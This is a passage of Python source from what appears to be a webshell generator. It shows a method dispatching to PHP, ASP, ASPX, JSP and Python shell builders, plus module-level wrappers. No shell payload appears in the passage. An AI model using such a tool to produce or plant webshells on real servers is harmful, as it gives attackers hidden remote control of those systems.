            raise ValueError(f"Unknown shell type: {shell_type}")
            
    def generate_shell(self, shell_type: str, variant: str = "basic", password: Optional[str] = None) -> str:
        """
        Generate a webshell
        
        Args:
            shell_type: Shell language (php, asp, aspx, jsp, python)
            variant: Shell variant
            password: Optional password for protection
            
        Returns:
            Webshell code
            
        Raises:
            ValueError: If shell type is unknown
        """
        if shell_type == "php":
            return self.generate_php_shell(variant, password)
        elif shell_type == "asp":
            return self.generate_asp_shell(variant, password)
        elif shell_type == "aspx":
            return self.generate_aspx_shell(variant, password)
        elif shell_type == "jsp":
            return self.generate_jsp_result_shell(variant, password)
        elif shell_type == "python":
            return self.generate_python_result_shell(variant, password)
        else:
            raise ValueError(f"Unknown shell type: {shell_type}")

# Create singleton instance
webshell_generator = WebshellGenerator()

def get_available_shells() -> Dict[str, Dict[str, str]]:
    """
    Get available webshell types
    
    Returns:
        Dictionary of available shell types and variants
    """
    return webshell_generator.get_available_shells()

def generate_shell(shell_type: str, variant: str = "basic", password: Optional[str] = None) -> str:
    """
    Generate a webshell
    
    Args:
        shell_type: Shell language (php, asp, aspx, jsp, python)
        variant: Shell variant
        password: Optional password for protection
        
    Returns:
        Webshell code
    """
    return webshell_generator.generate_shell(shell_type, variant, password)